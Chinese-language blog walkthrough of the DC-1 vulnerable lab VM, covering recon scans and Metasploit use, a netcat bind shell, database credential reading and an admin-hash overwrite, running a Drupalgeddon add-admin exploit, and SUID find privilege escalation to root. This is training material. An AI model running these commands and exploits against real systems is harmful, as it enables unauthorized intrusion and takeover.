<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="渗透靶机总结"><meta name="keywords" content=""><meta name="author" content="George"><meta name="copyright" content="George"><title>渗透靶机总结 | A.</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-1"><span class="toc-number">1.</span> <span class="toc-text">DC-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">1.3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">1.4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">1.5.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thefinalflag"><span class="toc-number">1.6.</span> <span class="toc-text">thefinalflag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-2"><span class="toc-number">2.</span> <span class="toc-text">DC-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集-1"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1-1"><span class="toc-number">2.2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2-1"><span class="toc-number">2.3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#问题1【hydra】"><span class="toc-number">2.4.</span> <span class="toc-text">问题1【hydra】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-1"><span class="toc-number">2.5.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4-1"><span class="toc-number">2.6.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thefinalflag-1"><span class="toc-number">2.7.</span> <span class="toc-text">thefinalflag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-3"><span class="toc-number">3.</span> <span class="toc-text">DC-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集-2"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql漏洞发现admin用户密码"><span class="toc-number">3.2.</span> <span class="toc-text">sql漏洞发现admin用户密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#对hash密码进行解密"><span class="toc-number">3.3.</span> <span class="toc-text">对hash密码进行解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后台连接一句话木马"><span class="toc-number">3.4.</span> <span class="toc-text">后台连接一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹bash到kali上"><span class="toc-number">3.5.</span> <span class="toc-text">反弹bash到kali上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内核提权"><span class="toc-number">3.6.</span> <span class="toc-text">内核提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-4"><span class="toc-number">4.</span> <span class="toc-text">DC-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集-3"><span class="toc-number">4.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力破解弱口令"><span class="toc-number">4.2.</span> <span class="toc-text">暴力破解弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-number">4.3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力破解ssh"><span class="toc-number">4.4.</span> <span class="toc-text">暴力破解ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#teebee提权"><span class="toc-number">4.5.</span> <span class="toc-text">teebee提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实例"><span class="toc-number">4.5.1.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#计划任务修改权限"><span class="toc-number">4.5.2.</span> <span class="toc-text">计划任务修改权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#直接id-0写入passwd"><span class="toc-number">4.5.3.</span> <span class="toc-text">直接id&#x3D;0写入passwd</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-5"><span class="toc-number">5.</span> <span class="toc-text">DC-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集-4"><span class="toc-number">5.1.</span> <span class="toc-text">信息收集</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">99</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">渗透靶机总结</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.33.136</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22&#x2F;tcp  open  ssh</span><br><span class="line">80&#x2F;tcp  open  http</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">MAC Address: 00:0C:29:34:9E:E8 (VMware)</span><br></pre></td></tr></table></figure>

<p>ip：192.168.33.136</p>
<p>端口：</p>
<p>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind</p>
<p>22：试着尝试ssh免密登录？？？</p>
<p>这里可以hydra爆破一波</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>80：直接访问网页</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/1-1.png" alt="1-1"></p>
<p>用dirsearch扫了一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[08:46:04] 200 -    1KB - &#x2F;COPYRIGHT.txt                                   </span><br><span class="line">[08:46:14] 200 -   17KB - &#x2F;INSTALL                           </span><br><span class="line">[08:46:15] 200 -    1KB - &#x2F;INSTALL.mysql.txt</span><br><span class="line">[08:46:15] 200 -    2KB - &#x2F;INSTALL.pgsql.txt</span><br><span class="line">[08:46:15] 200 -   17KB - &#x2F;INSTALL.txt</span><br><span class="line">[08:46:16] 200 -   18KB - &#x2F;LICENSE                         </span><br><span class="line">[08:46:16] 200 -   18KB - &#x2F;LICENSE.txt</span><br><span class="line">[08:46:16] 200 -    8KB - &#x2F;MAINTAINERS.txt                 </span><br><span class="line">[08:46:22] 200 -    5KB - &#x2F;README                    </span><br><span class="line">[08:46:23] 200 -    5KB - &#x2F;README.txt                 </span><br><span class="line">[08:46:33] 200 -    9KB - &#x2F;UPGRADE                                         </span><br><span class="line">[08:46:33] 200 -    9KB - &#x2F;UPGRADE.txt</span><br><span class="line">[08:51:42] 301 -  319B  - &#x2F;includes  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;includes&#x2F;    </span><br><span class="line">[08:51:46] 200 -    7KB - &#x2F;index.php                      </span><br><span class="line">[08:52:37] 301 -  315B  - &#x2F;misc  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;misc&#x2F;</span><br><span class="line">[08:52:41] 301 -  318B  - &#x2F;modules  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;modules&#x2F;</span><br><span class="line">[08:52:57] 200 -    7KB - &#x2F;node                                             </span><br><span class="line">[08:53:50] 301 -  319B  - &#x2F;profiles  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;profiles&#x2F;</span><br><span class="line">[08:54:06] 200 -    2KB - &#x2F;robots.txt                     </span><br><span class="line">[08:54:11] 301 -  318B  - &#x2F;scripts  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;scripts&#x2F;</span><br><span class="line">[08:54:31] 301 -  316B  - &#x2F;sites  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;sites&#x2F;</span><br><span class="line">[08:54:32] 200 -  952B  - &#x2F;sites&#x2F;all&#x2F;modules&#x2F;README.txt</span><br><span class="line">[08:54:32] 200 -    0B  - &#x2F;sites&#x2F;example.sites.php</span><br><span class="line">[08:54:32] 200 -  904B  - &#x2F;sites&#x2F;README.txt</span><br><span class="line">[08:54:32] 200 -  767B  - &#x2F;sites&#x2F;all&#x2F;themes&#x2F;README.txt</span><br><span class="line">[08:55:04] 301 -  317B  - &#x2F;themes  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;themes&#x2F;      </span><br><span class="line">[08:55:22] 200 -    7KB - &#x2F;user                                </span><br><span class="line">[08:55:22] 200 -    7KB - &#x2F;user&#x2F;                     </span><br><span class="line">[08:55:23] 200 -    7KB - &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">[08:55:37] 200 -    2KB - &#x2F;web.config                  </span><br><span class="line">[08:55:58] 200 -   42B  - &#x2F;xmlrpc.php</span><br></pre></td></tr></table></figure>

<p>robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt</span><br><span class="line">#</span><br><span class="line"># This file is to prevent the crawling and indexing of certain parts</span><br><span class="line"># of your site by web crawlers and spiders run by sites like Yahoo!</span><br><span class="line"># and Google. By telling these &quot;robots&quot; where not to go on your site,</span><br><span class="line"># you save bandwidth and server resources.</span><br><span class="line">#</span><br><span class="line"># This file will be ignored unless it is at the root of your host:</span><br><span class="line"># Used:    http:&#x2F;&#x2F;example.com&#x2F;robots.txt</span><br><span class="line"># Ignored: http:&#x2F;&#x2F;example.com&#x2F;site&#x2F;robots.txt</span><br><span class="line">#</span><br><span class="line"># For more information about the robots.txt standard, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.robotstxt.org&#x2F;wc&#x2F;robots.html</span><br><span class="line">#</span><br><span class="line"># For syntax checking, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.sxw.org.uk&#x2F;computing&#x2F;robots&#x2F;check.html</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br></pre></td></tr></table></figure>



<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>msfconsole:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use   对应模块</span><br><span class="line">show options  查看信息</span><br><span class="line">set rhosts  远程主机ip</span><br><span class="line">run   攻击</span><br><span class="line">exploit 攻击</span><br><span class="line"></span><br><span class="line">shell 	拿到权限</span><br></pre></td></tr></table></figure>



<p>使用python反弹一个交互式shell【方便后续操作】</p>
<blockquote>
<p>方法一：</p>
<p>shell #权限，不是本地，是http链接，需要一个持久链接，反弹一个交互shell</p>
<p>python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
<p>方法二：</p>
<p>find /var/www/test -exec nc -lvp 9999 -e /bin/sh ;</p>
<p>nc 192.168.0.119 9999</p>
</blockquote>
<p>/var/www/profiles/testing:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version &#x3D; &quot;7.24&quot;</span><br><span class="line">project &#x3D; &quot;drupal&quot;</span><br><span class="line">datestamp &#x3D; &quot;1384983240&quot;</span><br></pre></td></tr></table></figure>





<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#39;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;drupaldb&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>进入数据库，查看users表，发现admin的密码被加密。</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><strong>方法一：</strong>【修改管理员密码】</p>
<p>查看官网文档+StackOverflow</p>
<p>发现mysql加密脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts&#x2F;password-hash.sh &#39;pass&#39;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh &#39;passwd&#39;</span><br><span class="line">php scripts&#x2F;password-hash.sh &#39;passwd&#39;</span><br><span class="line"></span><br><span class="line">password: passwd                hash: $S$DYUw2bI4eMoDktLEjoauViDb4yDZCQBI0bA7yoJa3oZNRHcZQgQH</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh ppap</span><br><span class="line">php scripts&#x2F;password-hash.sh ppap</span><br><span class="line"></span><br><span class="line">password: ppap          hash: $S$DCKCzF&#x2F;33eff52x&#x2F;Po.lQ5bYwDBAy8oVs&#x2F;8mZ7.GNaXFkjxyixXi</span><br></pre></td></tr></table></figure>



<p>我们虽然不能解密密码可是可以更新管理员的密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users SET pass&#x3D;&#39;$S$D5iUQJACoD2gCDtE0WaoCMmsoNPVD7Q84aXuHjuoIKwHhD9aKh9Z&#39; where name&#x3D;&#39;admin&#39;;</span><br></pre></td></tr></table></figure>





<p><strong>方法二：</strong>【添加具有管理员权限的用户】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看具体版本</span><br><span class="line">cat includes&#x2F;bootstrap.inc | grep VERSION</span><br><span class="line">define(&#39;VERSION&#39;, &#39;7.24&#39;);</span><br><span class="line">      $has_openssl &#x3D; version_compare(PHP_VERSION, &#39;5.3.4&#39;, &#39;&gt;&#x3D;&#39;) &amp;&amp; function_exists(&#39;openssl_random_pseudo_bytes&#39;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Add Admin User)                                                          | php&#x2F;webapps&#x2F;34992.py</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Admin Session)                                                           | php&#x2F;webapps&#x2F;44355.php</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (1)                                                | php&#x2F;webapps&#x2F;34984.py</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (2)                                                | php&#x2F;webapps&#x2F;34993.php</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Remote Code Execution)                                                   | php&#x2F;webapps&#x2F;35150.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀AGsite)-[&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps]</span><br><span class="line">└─# python 34992.py -t http:&#x2F;&#x2F;192.168.33.136 -u userAG -p 123456</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> flag3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</span><br></pre></td></tr></table></figure>







<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>在/etc/passwd里找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag4:x:1001:1001:Flag4,,,:&#x2F;home&#x2F;flag4:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>打开发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ cat flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>





<h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>估计是要提权了</p>
<blockquote>
<p>【SUID提权】</p>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p>find / -user root -perm -4000 -exec ls -ldb { }</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;pt_chown</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;sbin&#x2F;mount.nfs</span><br></pre></td></tr></table></figure>



<p>发现可以find提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find -name flag4.txt -exec &quot;whoami&quot; \;                                                           </span><br><span class="line">find -name flag4.txt -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br></pre></td></tr></table></figure>





